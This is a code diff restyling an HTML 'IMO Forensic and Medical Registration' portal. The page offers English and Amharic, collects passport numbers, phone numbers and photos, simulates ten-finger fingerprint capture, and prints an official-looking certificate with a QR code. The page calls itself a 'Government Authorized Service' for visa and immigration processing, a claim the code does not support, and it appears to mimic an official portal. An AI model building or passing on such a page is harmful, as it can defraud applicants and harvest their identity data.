+    border-top:1px solid rgba(0,58,112,.08); margin-top:40px;
+  }
+  .app-footer b{ color:var(--primary); }
+
+  /* ===================== ANIMATIONS ===================== */
+  .float-anim{ animation:floaty 4s ease-in-out infinite; }
+  @keyframes floaty{ 0%,100%{transform:translateY(0);} 50%{transform:translateY(-8px);} }
+
+  /* Toast */
+  .toast{
+    position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(40px);
+    background:var(--primary); color:#fff; padding:12px 20px; border-radius:12px;
+    font-weight:600; font-size:.9rem; box-shadow:0 14px 30px rgba(0,58,112,.4);
+    z-index:100; opacity:0; transition:all .35s; pointer-events:none;
+  }
+  .toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
+
+  /* ===================== RESPONSIVE ===================== */
+  @media (max-width:768px){
+    .header-inner{ padding:12px 14px; gap:10px; }
+    .brand-title{ font-size:1rem; }
+    .brand-sub{ font-size:.65rem; letter-spacing:.8px; }
+    .brand-mark{ width:44px; height:44px; }
+    .countries{ gap:6px; }
+    .flag-chip{ padding:5px 8px; font-size:.7rem; }
+    .lang-select{ margin-left:0; width:100%; justify-content:center; }
+    .container{ padding:18px 14px 60px; }
+    .card{ padding:22px 18px; border-radius:18px; }
+    .card-hero{ padding:24px 18px; }
+    .card-hero h1{ font-size:1.5rem; }
+    .form-grid{ grid-template-columns:1fr; }
+    .hand-title{ font-size:1.4rem; }
+    .scanner{ width:240px; height:240px; }
+    .fingerprint-target{ width:170px; height:170px; }
+    .fingerprint-target svg.fp-icon{ width:100px; height:100px; }
+    .finger-grid{ gap:6px; }
+    .finger-dot{ padding:8px 4px; }
+    .finger-dot .name{ font-size:.62rem; }
+    .info-grid{ grid-template-columns:1fr; }
+    .certificate{ padding:14px; }
+    .cert-body{ grid-template-columns:1fr; }
+    .cert-photo{ margin:0; }
+    .cert-footer{ gap:4px; }
+    .cert-sig-row{ grid-template-columns:1fr; gap:14px; }
+    .cert-date-row{ grid-template-columns:1fr 1fr; gap:8px; text-align:center; }
+    .cert-date-row > *:nth-child(2){ display:none; }
+    .cert-signature .sig-img{ width:140px; height:50px; }
+  }
+  @media (max-width:420px){
+    .brand-text{ display:none; }
+  }
+
+  /* ===================== PRINT (A4 SINGLE PAGE) ===================== */
+  @page{ size:A4 portrait; margin:8mm; }
+  @media print{
+    html, body{ background:#fff !important; }
+    body::before, body::after{ display:none !important; }
+    .app-header, .app-footer, .toast{ display:none !important; }
+    .container{ padding:0 !important; margin:0 !important; max-width:100% !important; }
+    .screen{ display:none !important; }
+    .screen#screen-receipt{ display:block !important; }
+    .screen#screen-receipt > .card{
+      background:#fff !important; box-shadow:none !important; border:none !important;
+      border-radius:0 !important; padding:0 !important; margin:0 !important;
+    }
+    .cert-toolbar{ display:none !important; }
+    .certificate{
+      box-shadow:none !important; border:none !important; border-radius:0 !important;
+      width:194mm !important; max-width:194mm !important; padding:6mm 8mm !important; margin:0 !important;
+      page-break-inside:avoid; break-inside:avoid; font-size:9.5pt !important;
+    }
+    .cert-header{ padding-bottom:8px !important; margin-bottom:8px !important; }
+    .cert-body{ gap:12px !important; }
+    .cert-photo{ width:100px !important; height:100px !important; }
+    .cert-footer{ margin-top:4px !important; padding-top:4px !important; gap:6px !important; }
+    .cert-sig-row{ gap:8px !important; }
+    .cert-date-row{ gap:8px !important; font-size:.55rem !important; }
+    .cert-date-row .dt{ font-size:.7rem !important; }
+    .cert-signature .sig-img{ width:140px !important; height:50px !important; }
+    .cert-seal-wrap svg{ width:90px !important; height:90px !important; }
+    .cert-qr #qrcode{ width:22mm !important; height:22mm !important; }
+    .cert-qr #qrcode img, .cert-qr #qrcode canvas{ width:22mm !important; height:22mm !important; }
+    .screen#screen-receipt{ page-break-after:avoid; page-break-inside:avoid; }
+  }
+</style>
 </head>
-<body class="text-slate-800">
+<body>
 
-    <!-- Header -->
-    <header class="glass-panel sticky top-0 z-50 border-b border-slate-200">
-        <div class="max-w-6xl mx-auto px-4 py-4">
-            <div class="flex flex-col md:flex-row justify-between items-center gap-4">
-                <div class="text-center md:text-left w-full">
-                    <h1 class="text-2xl md:text-3xl font-bold text-blue-900 tracking-tight" data-i18n="title">IMO Forensic and Medical Registration</h1>
-                    <div class="flex flex-wrap justify-center md:justify-start gap-4 mt-3 text-sm font-semibold text-slate-700 bg-blue-50/80 p-3 rounded-xl border border-blue-100 shadow-sm">
-                        <span class="flex items-center gap-2"><span class="text-2xl drop-shadow-sm">🇨🇦</span> Canada</span>
-                        <span class="flex items-center gap-2"><span class="text-2xl drop-shadow-sm">🇬🇧</span> United Kingdom</span>
-                        <span class="flex items-center gap-2"><span class="text-2xl drop-shadow-sm">🇺🇸</span> United States</span>
-                        <span class="flex items-center gap-2"><span class="text-2xl drop-shadow-sm">🇦🇺</span> Australia</span>
-                        <span class="flex items-center gap-2"><span class="text-2xl drop-shadow-sm">🇳🇿</span> New Zealand</span>
-                    </div>
-                </div>
-                <button onclick="toggleLanguage()" class="px-6 py-2 bg-blue-900 text-white rounded-lg font-semibold hover:bg-blue-800 transition-colors shadow-md flex items-center gap-2 whitespace-nowrap">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5h12M9 3v2m1.048 9.5A18.022 18.022 0 016.412 9m6.088 9h7M11 21l5-10 5 10M12.751 5C11.783 10.77 8.07 15.61 3 18.129"/></svg>
-                    <span id="lang-btn-text">Amharic</span>
-                </button>
-            </div>
+<!-- ===================== HEADER ===================== -->
+<header class="app-header">
+  <div class="header-inner">
+    <div class="brand">
+      <div class="brand-mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2L3 5v7c0 5 3.8 9.4 9 10 5.2-.6 9-5 9-10V5l-9-3z"/>
+          <path d="M9 12h6M12 9v6"/>
+        </svg>
+      </div>
+      <div class="brand-text">
+        <div class="brand-title" data-i18n="brandTitle">IMO Forensic and Medical Registration</div>
+        <div class="brand-sub" data-i18n="brandSub">Official Biometric Enrollment Portal</div>
+      </div>
+    </div>
+    <div class="countries" aria-label="Destination countries">
+      <span class="flag-chip">🇨🇦 <span data-i18n="cCanada">Canada</span></span>
+      <span class="flag-chip">🇬🇧 <span data-i18n="cUK">United Kingdom</span></span>
+      <span class="flag-chip">🇺🇸 <span data-i18n="cUSA">United States</span></span>
+      <span class="flag-chip">🇦🇺 <span data-i18n="cAUS">Australia</span></span>
+      <span class="flag-chip">🇳🇿 <span data-i18n="cNZ">New Zealand</span></span>
+    </div>
+    <label class="lang-select" title="Language">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+      </svg>
+      <select id="langSel">
+        <option value="en">English</option>
+        <option value="am">አማርኛ</option>
+      </select>
+    </label>
+  </div>
+</header>
+
+<!-- ===================== MAIN ===================== -->
+<main class="container">
+
+  <!-- ============== SCREEN: WELCOME ============== -->
+  <section id="screen-welcome" class="screen active">
+    <div class="card-hero">
+      <span class="ribbon" data-i18n="welcomeRibbon">Government Authorized Service</span>
+      <h1 style="margin-top:14px;" data-i18n="welcomeTitle">Welcome to the Official Biometric Registration Portal</h1>
+      <p data-i18n="welcomeDesc">A secure, government-grade enrollment system for visa, immigration, forensic, and medical registration processing. Begin your application below.</p>
+      <div class="actions center" style="margin-top:24px;">
+        <button class="btn btn-primary" id="startBtn">
+          <span data-i18n="startBtn">Begin Registration</span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+    <div class="card">
+      <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(220px,1fr)); gap:16px;">
+        <div style="padding:16px; border-radius:14px; background:rgba(0,58,112,.04);">
+          <div style="width:42px; height:42px; border-radius:12px; background:var(--grad-blue); display:grid; place-items:center; color:#fff; margin-bottom:10px;">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="22" height="22"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><path d="M20 8v6M23 11h-6"/></svg>
+          </div>
+          <h3 style="font-size:1rem; margin-bottom:4px;" data-i18n="feat1Title">Applicant Registration</h3>
+          <p style="color:var(--text-2); font-size:.85rem;" data-i18n="feat1Desc">Submit your personal details and identity document information securely.</p>
         </div>
-    </header>
-
-    <!-- Main Content -->
-    <main class="max-w-4xl mx-auto px-4 py-8">
-        
-        <!-- Progress Indicator -->
-        <div class="mb-8">
-            <div class="flex justify-between items-center relative">
-                <div class="absolute top-1/2 left-0 w-full h-1 bg-slate-200 -z-10 transform -translate-y-1/2 rounded"></div>
-                <div class="absolute top-1/2 left-0 h-1 bg-blue-900 -z-10 transform -translate-y-1/2 rounded transition-all duration-500" id="progress-bar" style="width: 0%"></div>
-                
-                <div class="step-indicator flex flex-col items-center gap-2" data-step="1">
-                    <div class="w-10 h-10 rounded-full border-2 border-blue-900 bg-blue-900 text-white flex items-center justify-center font-bold transition-all">1</div>
-                    <span class="text-xs font-semibold text-blue-900 hidden sm:block" data-i18n="step1">Registration</span>
-                </div>
-                <div class="step-indicator flex flex-col items-center gap-2" data-step="2">
-                    <div class="w-10 h-10 rounded-full border-2 border-slate-300 bg-white text-slate-500 flex items-center justify-center font-bold transition-all">2</div>
-                    <span class="text-xs font-semibold text-slate-500 hidden sm:block" data-i18n="step2">Biometric</span>
-                </div>
-                <div class="step-indicator flex flex-col items-center gap-2" data-step="3">
-                    <div class="w-10 h-10 rounded-full border-2 border-slate-300 bg-white text-slate-500 flex items-center justify-center font-bold transition-all">3</div>
-                    <span class="text-xs font-semibold text-slate-500 hidden sm:block" data-i18n="step3">Completion</span>
-                </div>
-                <div class="step-indicator flex flex-col items-center gap-2" data-step="4">
-                    <div class="w-10 h-10 rounded-full border-2 border-slate-300 bg-white text-slate-500 flex items-center justify-center font-bold transition-all">4</div>
-                    <span class="text-xs font-semibold text-slate-500 hidden sm:block" data-i18n="step4">Receipt</span>
-                </div>
-            </div>
+        <div style="padding:16px; border-radius:14px; background:rgba(30,136,229,.06);">
+          <div style="width:42px; height:42px; border-radius:12px; background:var(--grad-blue); display:grid; place-items:center; color:#fff; margin-bottom:10px;">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="22" height="22"><path d="M12 2v6M12 22v-6M2 12h6M22 12h-6"/><circle cx="12" cy="12" r="4"/></svg>
+          </div>
+          <h3 style="font-size:1rem; margin-bottom:4px;" data-i18n="feat2Title">Biometric Enrollment</h3>
+          <p style="color:var(--text-2); font-size:.85rem;" data-i18n="feat2Desc">Capture fingerprints from all ten fingers using advanced sensor simulation.</p>
         </div>
-
-        <!-- Step 1: Applicant Registration -->
-        <div id="step-1" class="step-content fade-in">
-            <div class="glass-panel rounded-2xl p-6 md:p-8">
-                <h2 class="text-2xl font-bold text-blue-900 mb-6 flex items-center gap-2">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
-                    <span data-i18n="step1">Applicant Registration</span>
-                </h2>
-                
-                <form id="registration-form" class="space-y-6">
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="fullName">Full Name</label>
-                            <input type="text" id="fullName" required class="w-full px-4 py-3 rounded-lg border border-slate-300 focus:border-blue-900 focus:ring-2 focus:ring-blue-900/20 outline-none transition-all" placeholder="John Doe">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="passportNumber">Passport Number</label>
-                            <input type="text" id="passportNumber" required class="w-full px-4 py-3 rounded-lg border border-slate-300 focus:border-blue-900 focus:ring-2 focus:ring-blue-900/20 outline-none transition-all" placeholder="A12345678">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="phoneNumber">Phone Number</label>
-                            <input type="tel" id="phoneNumber" required class="w-full px-4 py-3 rounded-lg border border-slate-300 focus:border-blue-900 focus:ring-2 focus:ring-blue-900/20 outline-none transition-all" placeholder="+1 234 567 8900">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="nationality">Nationality</label>
-                            <input type="text" id="nationality" required class="w-full px-4 py-3 rounded-lg border border-slate-300 focus:border-blue-900 focus:ring-2 focus:ring-blue-900/20 outline-none transition-all" placeholder="Country">
-                        </div>
-                    </div>
-                    
-                    <div>
-                        <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="photoUpload">Passport Photo Upload</label>
-                        <div class="flex items-center gap-4">
-                            <label class="flex-1 cursor-pointer">
-                                <div class="border-2 border-dashed border-slate-300 rounded-lg p-6 text-center hover:border-blue-900 hover:bg-blue-50/50 transition-all">
-                                    <svg class="w-8 h-8 mx-auto text-slate-400 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
-                                    <span class="text-sm text-slate-600" data-i18n="photoUpload">Click to upload photo</span>
-                                </div>
-                                <input type="file" id="passportPhoto" accept="image/*" required class="hidden" onchange="previewImage(this)">
-                            </label>
-                            <img id="photo-preview" class="w-24 h-24 rounded-lg object-cover border-2 border-slate-200 hidden">
-                        </div>
-                    </div>
-
-                    <div>
-                        <label class="block text-sm font-semibold text-slate-700 mb-2" data-i18n="digitalSignature">Digital Signature</label>
-                        <div class="border border-slate-300 rounded-lg bg-white p-2 shadow-sm">
-                            <canvas id="signature-canvas" width="600" height="200" class="signature-canvas w-full h-40 border border-slate-200 rounded bg-white"></canvas>
-                            <div class="flex justify-end mt-2">
-                                <button type="button" onclick="clearSignature()" class="text-sm text-red-600 hover:text-red-800 font-medium flex items-center gap-1 px-3 py-1 rounded hover:bg-red-50 transition-colors">
-                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
-                                    <span data-i18n="clear">Clear</span>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <button type="submit" class="w-full md:w-auto px-8 py-3 bg-blue-900 text-white rounded-lg font-semibold hover:bg-blue-800 transition-all shadow-lg hover:shadow-xl flex items-center justify-center gap-2">
-                        <span data-i18n="next">Next</span>
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>
-                    </button>
-                </form>
-            </div>
+        <div style="padding:16px; border-radius:14px; background:rgba(201,162,39,.07);">
+          <div style="width:42px; height:42px; border-radius:12px; background:var(--grad-gold); display:grid; place-items:center; color:#3a2c00; margin-bottom:10px;">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="22" height="22"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M9 13l2 2 4-4"/></svg>
+          </div>
+          <h3 style="font-size:1rem; margin-bottom:4px;" data-i18n="feat3Title">Official Certificate</h3>
+          <p style="color:var(--text-2); font-size:.85rem;" data-i18n="feat3Desc">Receive a certified registration receipt with secure QR verification.</p>
         </div>
+      </div>
+    </div>
+  </section>
 
-        <!-- Step 2: Biometric Enrollment -->
-        <div id="step-2" class="step-content hidden fade-in">
-            <div class="glass-panel rounded-2xl p-6 md:p-8 text-center">
-                <h2 class="text-2xl font-bold text-blue-900 mb-2" data-i18n="step2">Biometric Enrollment</h2>
-                <p class="text-slate-600 mb-8" id="finger-instruction" data-i18n="startScan">Touch scanner to begin</p>
-                
-                <div class="flex justify-center mb-8">
-                    <div class="scanner-area" id="scanner-area" onclick="startScan()" ontouchstart="startScan(event)">
-                        <div class="scan-line"></div>
-                        <svg class="fingerprint-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-                            <path d="M12 4c-4.41 0-8 3.59-8 8 0 1.85.63 3.55 1.69 4.91l1.42-1.42C6.47 14.43 6 13.27 6 12c0-3.31 2.69-6 6-6s6 2.69 6 6c0 1.27-.47 2.43-1.11 3.49l1.42 1.42C19.37 15.55 20 13.85 20 12c0-4.41-3.59-8-8-8z"/>
-                            <path d="M12 6c-3.31 0-6 2.69-6 6 0 1.34.44 2.58 1.18 3.59l1.41-1.41C8.24 13.53 8 12.79 8 12c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .79-.24 1.53-.59 2.18l1.41 1.41C17.56 14.58 18 13.34 18 12c0-3.31-2.69-6-6-6z"/>
-                        </svg>
-                    </div>
-                </div>
+  <!-- ============== SCREEN: STEP 1 - REGISTRATION ============== -->
+  <section id="screen-step1" class="screen">
+    <div class="progress-wrap">
+      <div class="progress-label" data-i18n="step1Label">Step 1 of 3</div>
+      <div class="progress-track"><div class="progress-fill" id="progFill" style="width:33%"></div></div>
+      <div class="progress-count">33%</div>
+    </div>
+    <div class="card">
+      <span class="ribbon blue" data-i18n="step1Ribbon">Applicant Information</span>
+      <h2 style="font-size:1.6rem; margin:10px 0 4px;" data-i18n="step1Title">Personal & Identity Details</h2>
+      <p style="color:var(--text-2); margin-bottom:20px;" data-i18n="step1Desc">Please provide accurate information as it appears on your passport.</p>
 
-                <div class="flex justify-center gap-3 flex-wrap" id="finger-tracker">
-                    <!-- Generated by JS -->
-                </div>
-            </div>
-        </div>
-
-        <!-- Step 3: Completion -->
-        <div id="step-3" class="step-content hidden fade-in">
-            <div class="glass-panel rounded-2xl p-8 md:p-12 text-center">
-                <div class="success-checkmark">
-                    <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
-                </div>
-                <h2 class="text-3xl font-bold text-blue-900 mb-4" data-i18n="regSuccessful">Registration Successful</h2>
-                <div class="space-y-2 mb-8">
-                    <p class="text-lg text-slate-700 flex items-center justify-center gap-2">
-                        <svg class="w-5 h-5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-                        <span data-i18n="bioCompleted">Biometric Enrollment Completed</span>
-                    </p>
-                    <p class="text-lg text-slate-700 flex items-center justify-center gap-2">
-                        <svg class="w-5 h-5 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-                        <span data-i18n="applicantRegistered">Applicant Successfully Registered</span>
-                    </p>
-                </div>
-                
-                <div class="bg-slate-50 rounded-xl p-6 max-w-md mx-auto mb-8 border border-slate-200">
-                    <div class="grid grid-cols-2 gap-4 text-left">
-                        <div>
-                            <p class="text-xs text-slate-500 uppercase tracking-wider font-semibold" data-i18n="regId">Registration ID</p>
-                            <p class="text-lg font-bold text-blue-900" id="display-reg-id">-</p>
-                        </div>
-                        <div>
-                            <p class="text-xs text-slate-500 uppercase tracking-wider font-semibold" data-i18n="regDate">Registration Date</p>
-                            <p class="text-lg font-semibold text-slate-800" id="display-reg-date">-</p>
-                        </div>
-                        <div class="col-span-2">
-                            <p class="text-xs text-slate-500 uppercase tracking-wider font-semibold" data-i18n="regTime">Registration Time</p>
-                            <p class="text-lg font-semibold text-slate-800" id="display-reg-time">-</p>
-                        </div>
-                    </div>
-                </div>
-
-                <button onclick="goToStep(4)" class="px-8 py-3 bg-emerald-600 text-white rounded-lg font-semibold hover:bg-emerald-700 transition-all shadow-lg flex items-center justify-center gap-2 mx-auto">
-                    <span data-i18n="viewReceipt">View Receipt</span>
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
-                </button>
-            </div>
+      <form id="applicantForm" novalidate>
+        <div class="form-grid">
+          <div class="field full">
+            <label class="label" for="fullName"><span data-i18n="lblName">Full Name</span> <span class="req">*</span></label>
+            <input class="input" type="text" id="fullName" required autocomplete="name" data-i18n-ph="phName" placeholder="As shown on your passport" />
+            <div class="err-msg" data-i18n="errName">Please enter your full name.</div>
+          </div>
+          <div class="field">
+            <label class="label" for="passport"><span data-i18n="lblPassport">Passport Number</span> <span class="req">*</span></label>
+            <input class="input" type="text" id="passport" required data-i18n-ph="phPassport" placeholder="e.g. PA1234567" />
+            <div class="err-msg" data-i18n="errPassport">Please enter a valid passport number.</div>
+          </div>
+          <div class="field">
+            <label class="label" for="phone"><span data-i18n="lblPhone">Phone Number</span> <span class="req">*</span></label>
+            <input class="input" type="tel" id="phone" required data-i18n-ph="phPhone" placeholder="+1 555 123 4567" />
+            <div class="err-msg" data-i18n="errPhone">Please enter your phone number.</div>
+          </div>
+          <div class="field">
+            <label class="label" for="nationality"><span data-i18n="lblNationality">Nationality</span> <span class="req">*</span></label>
+            <select class="select" id="nationality" required>
+              <option value="" data-i18n="optSelect">— Select nationality —</option>
+              <option>Ethiopia</option><option>Canada</option><option>United Kingdom</option>
+              <option>United States</option><option>Australia</option><option>New Zealand</option>
+              <option>India</option><option>Pakistan</option><option>Bangladesh</option>
+              <option>Philippines</option><option>Nigeria</option><option>Kenya</option>
+              <option>South Africa</option><option>Germany</option><option>France</option>
+              <option>Italy</option><option>Spain</option><option>China</option>
+              <option>Japan</option><option>Brazil</option><option>Mexico</option>
+            </select>
+            <div class="err-msg" data-i18n="errNationality">Please select your nationality.</div>
+          </div>
+          <div class="field">
+            <label class="label"><span data-i18n="lblPhoto">Passport Photo</span> <span class="req">*</span></label>
+            <label class="photo-upload" for="photo">
+              <div class="icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              </div>
+              <div class="info">
+                <b data-i18n="photoUpB">Upload Passport Photo</b>
+                <span data-i18n="photoUpS">JPG or PNG, max 5MB</span>
+              </div>
+              <img id="photoPreview" class="photo-preview" alt="preview" />
+            </label>
+            <input type="file" id="photo" accept="image/*" required />
+            <div class="err-msg" data-i18n="errPhoto">Please upload a passport photo.</div>
+          </div>
         </div>
 
-        <!-- Step 4: Receipt -->
-        <div id="step-4" class="step-content hidden fade-in">
-            <div class="no-print flex flex-col sm:flex-row justify-end gap-3 mb-4">
-                <button onclick="downloadPDF()" class="px-6 py-2 bg-blue-900 text-white rounded-lg font-semibold hover:bg-blue-800 transition-all shadow-md flex items-center justify-center gap-2">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
-                    <span data-i18n="downloadPdf">Download PDF</span>
-                </button>
-                <button onclick="window.print()" class="px-6 py-2 bg-slate-700 text-white rounded-lg font-semibold hover:bg-slate-600 transition-all shadow-md flex items-center justify-center gap-2">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z"/></svg>
-                    <span data-i18n="printReceipt">Print Receipt</span>
-                </button>
-            </div>
+        <div class="actions right">
+          <button type="button" class="btn btn-ghost" id="backWelcomeBtn">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+            <span data-i18n="btnBack">Back</span>
+          </button>
+          <button type="submit" class="btn btn-primary">
+            <span data-i18n="btnNext">Continue to Biometrics</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+          </button>
+        </div>
+      </form>
+    </div>
+  </section>
 
-            <div id="receipt-content" class="bg-white p-8 md:p-12 rounded-xl shadow-2xl border-2 border-blue-900 max-w-3xl mx-auto">
-                <!-- Receipt Header -->
-                <div class="border-b-2 border-blue-900 pb-6 mb-6 flex flex-col sm:flex-row justify-between items-start gap-4">
-                    <div>
-                        <h1 class="text-2xl font-bold text-blue-900 uppercase tracking-wide">IMO Forensic and Medical Registration</h1>
-                        <p class="text-slate-600 mt-1 text-sm">Official Registration Receipt</p>
-                    </div>
-                    <div class="text-right">
-                        <div class="inline-block px-4 py-1 bg-emerald-100 text-emerald-800 font-bold rounded border border-emerald-300 text-sm tracking-wider" data-i18n="completedStatus">COMPLETED</div>
-                    </div>
-                </div>
+  <!-- ============== SCREEN: STEP 2 - LEFT HAND ============== -->
+  <section id="screen-step2" class="screen">
+    <div class="progress-wrap">
+      <div class="progress-label" data-i18n="step2Label">Step 2 of 3</div>
+      <div class="progress-track"><div class="progress-fill" id="progFill2" style="width:66%"></div></div>
+      <div class="progress-count">66%</div>
+    </div>
+    <div class="card biometric-stage">
+      <span class="ribbon" data-i18n="leftRibbon">Biometric Capture</span>
+      <h2 class="hand-title" style="margin-top:10px;" data-i18n="leftTitle">LEFT HAND ENROLLMENT</h2>
+      <p class="hand-sub" data-i18n="leftSub">Place each finger gently on the sensor when prompted. Capture is automatic.</p>
 
-                <!-- Receipt Body -->
-                <div class="grid md:grid-cols-3 gap-8 mb-8">
-                    <div class="md:col-span-1">
-                        <img id="receipt-photo" src="" alt="Applicant Photo" class="w-full aspect-[3/4] object-cover rounded-lg border-2 border-slate-200 shadow-sm">
-                    </div>
-                    <div class="md:col-span-2 space-y-4">
-                        <div class="grid grid-cols-2 gap-4">
-                            <div>
-                                <p class="text-xs text-slate-500 uppercase font-semibold" data-i18n="regId">Registration ID</p>
-                                <p class="font-bold text-blue-900 text-lg" id="receipt-reg-id">-</p>
-                            </div>
-                            <div>
-                                <p class="text-xs text-slate-500 uppercase font-semibold" data-i18n="regDate">Date</p>
-                                <p class="font-semibold text-slate-800" id="receipt-reg-date">-</p>
-                            </div>
-                        </div>
-                        <div class="border-t border-slate-200 pt-4 space-y-3">
-                            <div class="flex justify-between border-b border-slate-100 pb-2">
-                                <span class="text-slate-600 font-medium" data-i18n="fullName">Full Name</span>
-                                <span class="font-semibold text-slate-900 text-right" id="receipt-name">-</span>
-                            </div>
-                            <div class="flex justify-between border-b border-slate-100 pb-2">
-                                <span class="text-slate-600 font-medium" data-i18n="passportNumber">Passport Number</span>
-                                <span class="font-semibold text-slate-900 text-right" id="receipt-passport">-</span>
-                            </div>
-                            <div class="flex justify-between border-b border-slate-100 pb-2">
-                                <span class="text-slate-600 font-medium" data-i18n="phoneNumber">Phone Number</span>
-                                <span class="font-semibold text-slate-900 text-right" id="receipt-phone">-</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span class="text-slate-600 font-medium" data-i18n="nationality">Nationality</span>
-                                <span class="font-semibold text-slate-900 text-right" id="receipt-nationality">-</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+      <div class="finger-status"><span class="dot"></span><span id="leftStatus" data-i18n="leftStatus">Awaiting — Place Left Thumb</span></div>
 
-                <!-- Certification & Footer -->
-                <div class="border-t-2 border-slate-200 pt-6 mt-6">
-                    <p class="text-sm text-slate-600 italic mb-6" data-i18n="certification">I hereby certify that the above information is true and correct.</p>
-                    
-                    <div class="flex flex-col md:flex-row justify-between items-end gap-8">
-                        <div class="flex flex-col sm:flex-row items-start sm:items-end gap-8 flex-1">
-                            <div>
